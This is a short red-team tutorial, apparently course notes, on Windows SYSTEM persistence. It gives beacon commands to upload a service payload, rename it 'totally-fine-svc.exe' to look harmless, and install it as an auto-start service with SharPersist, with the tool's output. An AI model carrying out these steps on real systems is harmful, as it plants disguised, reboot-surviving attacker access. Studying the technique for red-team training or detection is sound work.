# Elevated SYSTEM Persistence



## Introduction

SYSTEM users are often restricted from connecting to web proxies due to a combination of security and operational reasons. By restricting proxy connections, Windows reduces the risk of SYSTEM account abuse. <mark style="color:red;">**Note**</mark>: For maintaining persistence, we will not be able to use HTTP connections. P2P or DNS will have to be used instead.

## Windows Services

With SYSTEM access, we'll be able to create our own service. We can escalate privileges with [SharPersist](https://github.com/mandiant/SharPersist).

#### Upload Service Payload

```powershell
beacon> cd C:\Windows
beacon> upload C:\Payloads\tcp-local_x64.svc.exe
beacon> mv tcp-local_x64.svc.exe totally-fine-svc.exe
```

#### Execute Privilege Escalation - SharPersist

```powershell
beacon> execute-assembly C:\Tools\SharPersist.exe -t service -c "C:\Windows\totally-fine-svc.exe" -n "totally-fine-svc" -m add

[*] INFO: Adding service persistence
[*] INFO: Command: C:\Windows\totally-fine-svc.exe
[*] INFO: Command Args: 
[*] INFO: Service Name: totally-fine-svc
```

This will create a stopped service with start type set to AUTO\_START. Which will start the service when the machine is rebooted.

